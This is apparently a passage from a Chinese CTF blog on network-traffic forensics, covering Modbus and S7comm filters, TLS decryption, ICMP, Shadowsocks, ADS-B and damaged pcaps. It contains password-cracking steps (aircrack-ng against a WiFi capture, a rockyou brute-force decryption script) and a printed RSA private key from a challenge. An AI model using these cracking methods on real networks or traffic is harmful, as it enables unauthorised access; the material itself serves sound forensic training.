> 由 Modbus/RTU 衍生，采用 0123456789ABCDEF 表示原本的从机地址、功能码、数据字段，并添加开始结束标记，所以长度翻倍 开始标记:（0x3A）1B + 从机地址 2B + 功能码 2B + 数据字段 xB+LRC 值 2B + 结束标记 \ r\n2B 最大长度 513B，因为数据字段在 RTU 中是最大 252B，所以在 ASCII 中最大 504B

**Modbus/TCP**

> 不再需要从机地址，改用 UnitID；不再需要 CRC/LRC，因为 TCP 自带校验 传输标识符 2B + 协议标识符 2B + 长度 2B + 从机 ID 1B + 功能码 1B + 数据字段 xB

一般题目考察 Modbus/TCP 比较多，然后主要考察的就是下面这种功能码（这里只列了部分） 因此解题的时候配合过滤器一个个功能码看过去就行

> 1：读线圈 2：读离散输入 3：读保持 4：读输入 5：写单个线圈 6：写单个保持 15：写多个线圈 16：写多个保持

#### [](#%e4%be%8b%e9%a2%981-hngk-modbus%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90)例题 1 HNGK-Modbus 流量分析

使用下面这个过滤器命令即可得到 flag

```
(((_ws.col.protocol == "Modbus/TCP") ) && (modbus.byte_cnt)) && (modbus.func_code == 16)
```

![](https://goodlunatic.github.io/posts/5422d65/imgs/image-20240430142133329.png) flag{TheModbusProtocolIsFunny!}

### [](#s7comm-%e5%8d%8f%e8%ae%ae%e5%88%86%e6%9e%90)S7comm 协议分析

> 西门子设备的工控协议，基于 COTP 实现，是 COTP 的上层协议 主要有三种类型：Job(1)、Ack_Data(3)/Ack(2)、Userdata(7) Job：下发任务 / 指令 Ack_Data：带有返回数据 Ack：单纯确认，含有数据 Userdata：用户自定义数据区，也包含功能指令

#### [](#%e4%be%8b%e9%a2%981-2020icsc%e6%b9%96%e5%b7%9e%e7%ab%99%e5%b7%a5%e6%8e%a7%e5%8d%8f%e8%ae%ae%e6%95%b0%e6%8d%ae%e5%88%86%e6%9e%90)例题 1 2020ICSC 湖州站—工控协议数据分析

首先过滤出 S7 协议的数据包，发现在一些 Ack_Data 的数据包中传输了二进制数据 ![](https://goodlunatic.github.io/posts/5422d65/imgs/image-20240430111822297.png) 因此，我们将所有带有二进制数据的数据包都过滤出来，发现一些 Job 的数据包中也有二进制数据 ![](https://goodlunatic.github.io/posts/5422d65/imgs/image-20240430112312109.png) 然后我们尝试将所有带有二进制数据的 Job 数据包都过滤出来并导出特定分组，过滤器代码如下

```
((s7comm) && (s7comm.resp.data)) && (s7comm.param.func == 0x05)
```

![](https://goodlunatic.github.io/posts/5422d65/imgs/image-20240430112740044.png)

然后使用 tshark 提取数据

```
tshark -r 1.pcap -T fields -e s7comm.resp.data | uniq
```

![](https://goodlunatic.github.io/posts/5422d65/imgs/image-20240430112936680.png)

最后 CyberChef 解码二进制即可得到 flag ![](https://goodlunatic.github.io/posts/5422d65/imgs/image-20240430113016466.png)

#### [](#%e4%be%8b%e9%a2%982-2020icsc%e6%b5%8e%e5%8d%97%e7%ab%99%e8%a2%ab%e7%af%a1%e6%94%b9%e7%9a%84%e6%95%b0%e6%8d%ae)例题 2 2020ICSC 济南站—被篡改的数据

翻看流量包，发现很多 S7COMM 数据包，使用过滤器过滤，发现 s7comm.resp.data 字段传了很多 66 数据 使用过滤器过滤出传了 s7comm.resp.data 字段数据但数据不是 66 的 S7 数据包 发现了疑似 flag 的数据，为了防止 flag 中含有 f 字符而被过滤 因此我们使用下面这个过滤命令进行过滤，然后导出特定分组

```
(((frame.number >= 19987 && frame.number <=20032) && (_ws.col.protocol == "S7COMM")) && (s7comm.param.func == 0x05)) && (s7comm.resp.data)
```

最后 tshark 提取出数据，然后十六进制解码即可得到 flag：flag{93137ad4a}

#### [](#%e4%be%8b%e9%a2%983-%e6%9e%a2%e7%bd%91%e6%99%ba%e7%9b%be2021%e5%bc%82%e5%b8%b8%e6%b5%81%e5%88%86%e6%9e%90)例题 3 枢网智盾 2021—异常流分析

打开流量包，发现很多 S7comm 流量，然后稍微过滤一下，发现是写入数据的流量 然后写入的数据几乎都是 ffff 开头的，因此我们直接查看不是 ffff 开头的数据

```
((_ws.col.protocol == "S7COMM") && (s7comm.param.func == 0x05)) && (s7comm.resp.data[0:2] != ff:ff)
```

即可得到 flag：flag{ffad28a0ce69db34751f}

#### [](#%e4%be%8b%e9%a2%984-%e6%9e%a2%e7%bd%91%e6%99%ba%e7%9b%be2021%e5%b7%a5%e6%8e%a7%e5%8d%8f%e8%ae%ae%e5%88%86%e6%9e%90)例题 4 枢网智盾 2021—工控协议分析

```
(_ws.col.protocol == "S7COMM") && (frame.number == 418)
```

![](https://goodlunatic.github.io/posts/5422d65/imgs/image-20240430135813366.png) 然后直接把明文传输的数据 base64 解码即可 ![](https://goodlunatic.github.io/posts/5422d65/imgs/image-20240430135958048.png) flag{hncome66!}

[](#%e8%93%9d%e7%89%99obex%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90)蓝牙 (OBEX) 流量分析
-----------------------------------------------------------------------------

在统计的协议分级中选中 OBEX 协议 然后查找 pin 的分组详情，获得压缩包的密码

[](#%e9%82%ae%e4%bb%b6stmp%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90)邮件 (STMP) 流量分析
-----------------------------------------------------------------------------

可以试试看导出对象 - 导出 IMF - 导出文件的后缀是 eml（可以使用网易邮箱大师打开）

eml 文件是将数据 base64 编码后再传输的，有些数据直接用邮箱软件打开可能看不到，建议手搓一遍

[](#%e6%97%a0%e7%ba%bf%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90)无线流量分析
-----------------------------------------------------------------

在 kali 中用弱口令密码爆破出 WIFI 密码 执行命令：aircrack-ng ctf.pcap -w rockyou.txt 执行命令解码：airdecap-ng -p password1 ctf.pcap -e ctf -o 1.pcap 然后打开解码后的文件，查找 flag

[](#slltls%e5%8a%a0%e5%af%86%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90)SLL、TLS 加密流量分析
-------------------------------------------------------------------------------

老版本的 wireshark 中显示的是 SSL，新版本的改成 TLS 了

解密方法就是点击 编辑 -> 首选项 -> Protocols -> TLS 加载 RSA 私钥 或 者加载日志文件 解完密后就和平常的流量分析一样了

例题 - BUU 第九章 TLS 流量分析

打开流量包发现有 TLS 数据包，然后还有一些红黑条纹，猜测是被加密了

翻看流量包，追踪 TCP 流，发现流 7 中 POST 了一个 sslkey.log 日志文件

![](https://goodlunatic.github.io/posts/5422d65/imgs/N7.png)

导出 sslkey.log 日志文件，然后按上面的步骤导入解密

![](https://goodlunatic.github.io/posts/5422d65/imgs/N8.png)

解密完后直接搜索 flag{字符串即可找到 flag{e3364403651e775bfb9b3ffa06b69994}

![](https://goodlunatic.github.io/posts/5422d65/imgs/N9.png)

例题 - DDCTF2018 流量分析

直接在 TLS 加载 RSA 私钥解密即可

私钥的格式如下：

```
-----BEGIN RSA PRIVATE KEY-----
MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ
LsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO
vMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB
AoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4
QGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/
QbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN
czILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ
ZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9
kzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN
+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1
AnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH
/5pfc3AmEyRdfyx6zwUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH
2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=
-----END RSA PRIVATE KEY-----
```

例题 - 2024 铁三初赛 流量分析

[](#icmp%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90)ICMP 流量分析
------------------------------------------------------

flag 可能藏在每一帧的长度中

```
tshark -r 1.pcapng -Y "icmp" -T fields -e frame.len | uniq > data.txt
```

```
with open('data.txt', 'r') as f:
    data = f.read().split()
flag = ''
for item in data:
    flag += chr(int(item)-42)
print(flag)
```

例题 - 第三届 “百越杯” 福建省高校网络空间安全大赛 要想会，先学会

[](#vpn%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90)VPN 流量分析
----------------------------------------------------

### [](#shadowsocks%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90)Shadowsocks 流量分析

例题 - 2023 强网杯 - 谍影重重 3.0

```
#请求解密脚本
import hashlib
from Crypto.Cipher import AES


def EVP_BytesToKey(password, key_len, iv_len):
    m = []
    i = 0
    while len(b''.join(m)) < (key_len + iv_len):
        md5 = hashlib.md5()
        data = password
        if i > 0:
            data = m[i - 1] + password
        md5.update(data)
        m.append(md5.digest())
        i += 1
    ms = b''.join(m)
    key = ms[:key_len]
    iv = ms[key_len:key_len + iv_len]
    return key, iv


def decrypt(cipher, password):
    key_len = int(256/8)
    iv_len = 16
    mode = AES.MODE_CFB
    key, _ = EVP_BytesToKey(password, key_len, iv_len)
    cipher = bytes.fromhex(cipher)
    iv = cipher[:iv_len]
    real_cipher = cipher[iv_len:]
    obj = AES.new(key, mode, iv, segment_size=128)
    plain = obj.decrypt(real_cipher)
    return plain


def main():
cipher = 'e0a77dfafb6948728ef45033116b34fc855e7ac8570caed829ca9b4c32c2f6f79184e333445c6027e18a6b53253dca03c6c464b8289cb7a16aa1766e6a0325ee842f9a766b81039fe50c5da12dfaa89eacce17b11ba9748899b49b071851040245fa5ea1312180def3d7c0f5af6973433544a8a342e8fcd2b1759086ead124e39a8b3e2f6dc5d56ad7e8548569eae98ec363f87930d4af80e984d0103036a91be4ad76f0cfb00206'
    # 因为password未知，所以我们这里尝试用字典进行爆破
    with open('rockyou.txt', 'rb') as f:
        lines = f.readlines()
    for password in lines:
        plain = decrypt(cipher, password.strip())
        if b'HTTP' in plain:
            print(password.decode(), plain.decode())
            break


if __name__ == "__main__":
    main()
```

### [](#vmessv2ray%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90)VMess(V2ray) 流量分析

#### [](#vmessmd5)VMessMD5

【例题：2022 强网杯 - 谍影重重】

#### [](#vmessaead)VMessAEAD

【例题：2024 DubheCTF-authenticated mess & unauthenticated less】

[](#ads-b%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90)ADS-B 流量分析
--------------------------------------------------------

飞机 / 航空器流量，找到流量数据，用 pyModeS 模块分析即可

例题

**[2023 强网杯] 谍影重重 2.0**

下载附件得到一个只有 TCP 流量的流量包 题目需要我们分析流量包找到飞机的飞机速度和飞机的 ICAO CODE 问了 GPT 得知飞机常见的协议中有 ADS-B，然后在网上找到 pyModeS 这个模块 在参考链接：https://gitee.com/wangmin-gf/ads-b 看到了与 tcp.payload 中相似的数据 使用 tshark 提取出流量包中的数据，然后使用这个脚本批量解密找 speed 最快的即可

tshark -r attach.pcapng -T fields -e “tcp.payload” | sed ‘/^\s*$/d’ > tshark.txt

```
import pyModeS
with open("tshark.txt") as f:
    data = f.readlines()
    for item in data:
        # print(item.strip())
        if len(item.strip()) != 46:
            continue
        res = pyModeS.tell(item.strip()[18:46])
        print("===========================================================================")
```

```
===========================================================================
                     Message: 8d79a05e990ccda6f80886dd9544
                ICAO address: 79a05e
             Downlink Format: 17
                    Protocol: Mode-S Extended Squitter (ADS-B)
                        Type: Airborne velocity
                       Speed: 371 knots
                       Track: 213.3474959459136 degrees
               Vertical rate: -64 feet/minute
                        Type: Ground speed
===========================================================================
```

[](#%e6%8d%9f%e5%9d%8f%e7%9a%84%e6%b5%81%e9%87%8f%e5%8c%85%e5%88%86%e6%9e%90)损坏的流量包分析
-------------------------------------------------------------------------------------

例题 - 第一届 “百度杯” 信息安全攻防总决赛 find the flag（flag 藏在 frame29-41 的 ip.id 字段中）

打开流量包后发现有如下的报错

![](https://goodlunatic.github.io/posts/5422d65/imgs/N10.png)

可以直接使用 [在线网站](https://f00l.de/hacking/pcapfix.php) 修复

修复完成以后就是正常的流量分析了

[](#%e4%bb%8e%e6%b5%81%e9%87%8f%e5%8c%85%e4%b8%ad%e6%89%be%e5%bc%82%e5%b8%b8%e6%b5%81%e9%87%8f)从流量包中找异常流量
---------------------------------------------------------------------------------------------------------

一般这种题目的做法就是，观察正常的流量包中的字段，毕竟一个流量包中正常的流量肯定占大多数， 然后结合过滤器，一个字段一个字段地进行排除，就是筛选出不等于正常字段值的流量。